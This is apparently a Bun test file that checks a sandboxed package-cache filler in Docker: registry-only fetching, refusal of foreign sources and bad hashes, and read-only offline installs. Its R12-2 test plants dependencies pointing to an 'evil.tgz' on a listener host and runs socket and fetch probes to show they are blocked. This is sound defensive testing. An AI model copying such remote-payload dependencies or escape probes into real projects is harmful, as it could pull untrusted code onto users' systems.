import { afterAll, describe, expect, setDefaultTimeout, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { chownSync, existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gzipSync } from "node:zlib";
import { FILLER_UID, fillerArgs, GATE_VM_ENV, type ProxyCounts, registryProxy } from "../src/index.ts";

/*
 * The node's install cache on a real Docker (install-cache.ts): its filler, as the node runs it (fillerArgs), with no
 * network but the node's proxy (registry-proxy.ts, run here as the node runs it), filling a folder of this run's own
 * from the registry; and a round of gates' VM (no network, the cache mounted read-only) installing from it offline. A
 * lockfile that names another source is refused before anything is fetched; one whose hash isn't the registry's is
 * refused before any tarball is; a package that wasn't filled fails the gate's install, offline. And the filler reaches
 * nothing else: a listener of this run's on Docker's default bridge receives nothing, whatever the filler is given or
 * asks (the twelfth fabric re-review's R12-2). It prints what each fill took.
 *
 * Every container is this run's own (`install-cache-<hex>-`), removed by its own name; the one that listens on the bridge
 * is this run's listener, and only this run's filler is asked to reach it. Linux, Docker, the sandbox image and the
 * registry (registry.npmjs.org) reachable from the host. Skipped, and so unverified, anywhere else.
 */

setDefaultTimeout(600_000);

const IMAGE = process.env.INVINCIBLE_TEST_SANDBOX_IMAGE ?? "invincible/sandbox:1";
const docker = (args: string[], input?: Uint8Array) => spawnSync("docker", args, { encoding: "utf8", timeout: 300_000, ...(input ? { input } : {}) });
const available = process.platform === "linux" && docker(["version", "--format", "{{.Server.Version}}"]).status === 0 && docker(["image", "inspect", IMAGE]).status === 0;
if (!available) console.log(`${import.meta.file} SKIPPED, unverified: it needs Linux, a Docker it can reach, and ${IMAGE}.`);

const PREFIX = `install-cache-${randomBytes(3).toString("hex")}-`;
const dir = mkdtempSync(join(tmpdir(), PREFIX));
let made = 0;
afterAll(() => {
  // (Each filler and VM goes as it ends, --rm; one a deadline cut short goes by its own name, and so does the listener.)
  for (let n = 1; n <= made; n++) docker(["rm", "-f", `${PREFIX}${n}`]);
  docker(["rm", "-f", `${PREFIX}listener`]);
  rmSync(dir, { recursive: true, force: true });
});
const named = () => `${PREFIX}${++made}`;
/** The image's PATH, as the node reads it for the filler (imagePath). */
const path = () => JSON.parse(docker(["image", "inspect", "--format", "{{json .Config.Env}}", IMAGE]).stdout).find((e: string) => e.startsWith("PATH="))?.slice(5) ?? "/usr/local/bin:/usr/bin:/bin";
const root = process.getuid?.() === 0;
/** A folder of this run's, the filler's user's, as the node makes it. */
function folder(name: string): string {
  const at = join(dir, `${name}-${++made}`);
  mkdirSync(at, { mode: name === "cache" ? 0o755 : 0o700 });
  if (root) chownSync(at, FILLER_UID, FILLER_UID);
  return at;
}
const cacheFolder = () => folder("cache");
const user = () => (process.getuid?.() ? `${process.getuid!()}:${process.getgid!()}` : `${FILLER_UID}:${FILLER_UID}`);
/** What the task's VM gives the filler: a gzipped tar of `files` (its bun.lock alone, but where a case gives more). */
function manifests(files: Record<string, string>): Uint8Array {
  const at = mkdtempSync(join(dir, "m-"));
  for (const [file, text] of Object.entries(files)) writeFileSync(join(at, file), text);
  const tar = spawnSync("tar", ["-c", "-C", at, ...Object.keys(files)]);
  return gzipSync(tar.stdout);
}
/**
 * A fill, as the node runs it: the node's proxy on a socket of the fill's own, the filler's container (or, with `script`,
 * the same container running `script` instead: what a filler could ask of its way out), its exit, what it said, how long
 * the whole container took, and what the proxy did.
 */
async function fill(cache: string, given: Uint8Array, script?: string) {
  const way = folder("way");
  const socket = join(way, "registry.sock");
  const proxy = await registryProxy(socket);
  if (root) chownSync(socket, FILLER_UID, FILLER_UID);
  const began = performance.now();
  const args = fillerArgs({ name: named(), image: IMAGE, cache, user: user(), path: path(), proxy: way });
  if (script) args[args.length - 1] = script;
  // (Asynchronously: the proxy answers in this process while the filler runs.)
  const proc = Bun.spawn(["docker", ...args], { stdin: new Blob([new Uint8Array(given)]), stdout: "pipe", stderr: "pipe" });
  const [out, err, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
  const counts: ProxyCounts = proxy.close();
  return { code, out: out.trim(), said: err.trim(), ms: Math.round(performance.now() - began), counts };
}
/** A lockfile made the honest way, by bun in a scratch container on the bridge, for `deps`. */
function locked(deps: Record<string, string>): { "package.json": string; "bun.lock": string } {
  const manifest = JSON.stringify({ name: "app", private: true, dependencies: deps });
  const ran = docker(["run", "--rm", "--name", named(), "--network", "bridge", "--user", "65534:65534", "--read-only", "--cap-drop", "ALL", "--tmpfs", "/tmp:rw,size=512m,mode=1777", "--entrypoint", "/usr/bin/env", IMAGE, "-i", `PATH=${path()}`, "HOME=/tmp/h", "BUN_INSTALL_CACHE_DIR=/tmp/c", "/bin/bash", "--noprofile", "--norc", "-c", `mkdir -p /tmp/a && cd /tmp/a && printf '%s' '${manifest}' > package.json && bun install --ignore-scripts >/dev/null 2>&1 && cat bun.lock`]);
  if (ran.status !== 0) throw new Error(`no lockfile could be made: ${ran.stderr}`);
  return { "package.json": manifest, "bun.lock": ran.stdout };
}
/** A round of gates' VM, as the node makes one, the cache mounted read-only: `command` run in a copy of `files`, as a gate's user, its environment a gate's. */
function gate(cache: string, files: Record<string, string>, command: string) {
  const script = Object.entries(files).map(([file, text]) => `printf '%s' '${text.replaceAll("'", "'\\''")}' > ${file}`).join("; ");
  const ran = docker(["run", "--rm", "--name", named(), "--init", "--user", "61001:61001", "--cap-drop", "ALL", "--security-opt", "no-new-privileges:true", "--read-only", "--network", "none", "--tmpfs", "/tmp:rw,nosuid,nodev,size=256m,mode=1777", "--tmpfs", "/gates:rw,exec,nosuid,nodev,size=1g,mode=1777", "--mount", `type=bind,src=${cache},dst=/cache/bun,readonly`, "--env", `${GATE_VM_ENV}=1`, "--env", "BUN_INSTALL_CACHE_DIR=/cache/bun", "--workdir", "/gates", "--entrypoint", "/usr/bin/env", IMAGE, "-i", `PATH=${path()}`, "HOME=/gates/a/home", "TMPDIR=/gates/a/tmp", "BUN_INSTALL_CACHE_DIR=/cache/bun", "/bin/bash", "--noprofile", "--norc", "-c", `mkdir -m 700 -p /gates/a/home /gates/a/tmp /gates/a/tree && cd /gates/a/tree && ${script} && ${command}`]);
  return { code: ran.status, out: `${ran.stdout}${ran.stderr}` };
}
/** This run's listener on Docker's default bridge: where it is, and what reached it. */
function listener(): { at: string; heard: () => string } {
  const server = 'import socket\ns = socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind(("0.0.0.0", 47124))\ns.listen(16)\nprint("listening", flush=True)\nwhile True:\n    c, a = s.accept()\n    c.settimeout(2)\n    try:\n        print("heard", a[0], c.recv(200), flush=True)\n    except OSError:\n        print("heard", a[0], flush=True)\n    c.close()\n';
  const name = `${PREFIX}listener`;
  const ran = docker(["run", "-d", "--rm", "--name", name, "--network", "bridge", "--user", "65534:65534", "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges:true", "--memory", "64m", "--pids-limit", "16", "--entrypoint", "/usr/bin/python3", IMAGE, "-I", "-u", "-c", server]);
  if (ran.status !== 0) throw new Error(`no listener could be started: ${ran.stderr}`);
  const ip = docker(["inspect", "--format", "{{.NetworkSettings.Networks.bridge.IPAddress}}", name]).stdout.trim();
  for (let i = 0; i < 50 && !docker(["logs", name]).stdout.includes("listening"); i++) spawnSync("sleep", ["0.1"]);
  return { at: `${ip}:47124`, heard: () => docker(["logs", name]).stdout.split("\n").filter((line) => line.startsWith("heard")).join("\n") };
}

describe.skipIf(!available)("the node's install cache, on a real Docker", () => {
  const TEST = `import { expect, test } from "bun:test";\nimport isOdd from "is-odd";\ntest("odd", () => expect(isOdd(3)).toBe(true));\n`;
  // (Made once, by whichever test asks first: the R12-2 case runs alone too.)
  let lockMade: ReturnType<typeof locked> | null = null;
  const honest = () => (lockMade ??= locked({ "is-odd": "3.0.1" }));
  let cache = "";

  test("a lockfile of the registry's packages fills it, through the node's proxy alone, as the node's filler runs; the same again finds it there", async () => {
    cache = cacheFolder();
    const first = await fill(cache, manifests({ "bun.lock": honest()["bun.lock"] }));
    expect([first.code, first.said.split("\n").at(-1)]).toEqual([0, expect.stringMatching(/installed|packages|done|Saved/i)]);
    const entries = readdirSync(cache);
    expect(entries.some((e) => e.startsWith("is-odd@3.0.1"))).toBe(true);
    expect(entries.some((e) => e.startsWith("is-number@"))).toBe(true);
    expect(first.counts.tunnels).toBeGreaterThan(0);
    expect([first.counts.refused, first.counts.first]).toEqual([0, []]);
    const again = await fill(cache, manifests({ "bun.lock": honest()["bun.lock"] }));
    expect(again.code).toBe(0);
    console.log(`the filler, whole: ${first.ms} ms with an empty cache (${entries.length} entries made, ${first.counts.tunnels} tunnels), ${again.ms} ms again with nothing new (${again.counts.tunnels} tunnels)`);
  });

  test("a round's VM installs from it offline, as a gate's user, and can write nothing of it", () => {
    const ran = gate(cache, { ...honest(), "odd.test.ts": TEST }, "bun install --frozen-lockfile && bun test odd.test.ts && (touch /cache/bun/x 2>&1 || true)");
    expect(ran.code).toBe(0);
    expect(ran.out).toContain("1 pass");
    expect(ran.out).toContain("Read-only file system");
    expect(existsSync(join(cache, "x"))).toBe(false);
  });

  test("a package that wasn't filled fails a gate's install, offline: bun says only that it can't write its cache (the node's gate says why)", () => {
    const other = locked({ "is-even": "1.0.0" });
    const ran = gate(cache, other, "bun install --frozen-lockfile");
    expect(ran.code).not.toBe(0);
    expect(ran.out).toContain("EROFS accessing temporary directory");
    expect(readdirSync(cache).some((e) => e.startsWith("is-even@"))).toBe(false);
  });

  test("a lockfile that names another source is refused before anything is fetched, and nothing is filled; and so is anything given beside it", async () => {
    const fresh = cacheFolder();
    const git = honest()["bun.lock"].replace(/"is-odd@3\.0\.1", "",/, '"is-odd@github:someone/is-odd#abc", {},');
    const ran = await fill(fresh, manifests({ "bun.lock": git }));
    expect([ran.code, ran.said.split("\n").at(-1)]).toEqual([1, expect.stringContaining("isn't the default registry")]);
    expect(ran.counts).toEqual({ tunnels: 0, refused: 0, first: [] });
    expect(readdirSync(fresh)).toEqual([]);
    // Nor anything of the tree's besides: its package.json, a bunfig.toml naming a registry of its own.
    for (const [file, text] of [
      ["package.json", honest()["package.json"]],
      ["bunfig.toml", `[install]\nregistry = "http://192.0.2.1/"\n`],
    ] as const) {
      const configured = await fill(fresh, manifests({ "bun.lock": honest()["bun.lock"], [file]: text }));
      expect([configured.code, configured.said]).toEqual([1, `what it was given holds ${file}, and a fill is given its bun.lock alone, so nothing is filled`]);
      expect(configured.counts.tunnels).toBe(0);
    }
    expect(readdirSync(fresh)).toEqual([]);
  });

  test("a lockfile whose hash isn't the registry's is refused before any tarball is fetched, and the cache is left as it was: not a package, nor the registry's word of one (I-13b)", async () => {
    const fresh = cacheFolder();
    const hash = /"is-odd@3\.0\.1", "",[^\n]*?"(sha512-[^"]+)"/.exec(honest()["bun.lock"])?.[1];
    expect(hash).toBeDefined();
    const wrong = `sha512-${"A".repeat(86)}==`;
    const ran = await fill(fresh, manifests({ "bun.lock": honest()["bun.lock"].replace(hash!, wrong) }));
    expect([ran.code, ran.said.split("\n").at(-1)]).toEqual([1, "its bun.lock's hash of is-odd@3.0.1 isn't the registry's, so nothing is filled"]);
    // (Its resolve step had a cache of its own, in the filler's memory: the node's has nothing of it.)
    expect(readdirSync(fresh)).toEqual([]);
  });

  /*
   * The twelfth review's R12-2: the filler ran on Docker's default bridge, from which it reached what the host does, and
   * bun fetched whatever a catalog named from a container there and kept it in the cache. Now the filler has no network,
   * and is given the lockfile alone: what a catalog names never reaches bun, and nothing but the registry is reached.
   */
  test("R12-2: a listener of this run's on Docker's default bridge receives nothing, whether a catalog names it or the filler asks it straight", async () => {
    const heard = listener();
    const catalog = honest()["bun.lock"].replace('"is-odd": "3.0.1"', '"is-odd": "catalog:"');
    const manifest = JSON.stringify({ name: "app", private: true, workspaces: { packages: [], catalog: { "is-odd": `http://${heard.at}/evil.tgz` } }, dependencies: { "is-odd": "catalog:" } });
    // A manifest whose catalog names it, given beside its lockfile (the review's t1b): refused, and nothing fetched.
    const fresh = cacheFolder();
    const given = await fill(fresh, manifests({ "bun.lock": catalog.replace('"packages": {', `"catalog": { "is-odd": "3.0.1" },\n  "packages": {`), "package.json": manifest }));
    console.log(`  a catalog naming the listener: exit ${given.code}, said ${JSON.stringify(given.said.split("\n").at(-1))}, its way out: ${JSON.stringify(given.counts)}`);
    expect(given.code).not.toBe(0);
    // The filler's own container, asking the listener itself: straight, through its way out as bun does, and by bun's install.
    const [ip, port] = heard.at.split(":");
    const probe = `/usr/bin/python3 -I -c "$FORWARD" /proxy/registry.sock 3128 /tmp/forwarding & for _ in {1..100}; do [ -e /tmp/forwarding ] && break; sleep 0.05; done
/usr/bin/python3 -I -c 'import socket, sys
try:
    s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=3)
    s.sendall(b"GET /straight HTTP/1.0\\r\\n\\r\\n")
    print("straight: reached")
except OSError as e:
    print("straight:", e)' ${ip} ${port}
cd /tmp && bun -e 'for (const url of ["http://${heard.at}/proxied", "https://${heard.at}/tunnelled"]) { try { const r = await fetch(url); console.log("fetch:", url, r.status) } catch (e) { console.log("fetch:", url, String(e).slice(0, 120)) } }'
mkdir -p /tmp/p && cd /tmp/p && printf '%s' '{"name":"p","dependencies":{"evil":"http://${heard.at}/evil.tgz"}}' > package.json && timeout 60 bun install --ignore-scripts --no-progress 2>&1 | tail -n 2
true`;
    const asked = await fill(cacheFolder(), manifests({ "bun.lock": honest()["bun.lock"] }), probe);
    console.log(`  the filler's container asking the listener:\n    ${asked.out.split("\n").join("\n    ")}\n  its way out: ${JSON.stringify(asked.counts)}\n  the listener heard: ${JSON.stringify(heard.heard())}`);
    expect(asked.out).not.toContain("straight: reached");
    expect(asked.counts.tunnels).toBe(0);
    expect(asked.counts.refused).toBeGreaterThan(0);
    // What reached the listener: nothing.
    expect(heard.heard()).toBe("");
    expect(readdirSync(fresh).some((e) => e.includes("@@@"))).toBe(false);
  });
});
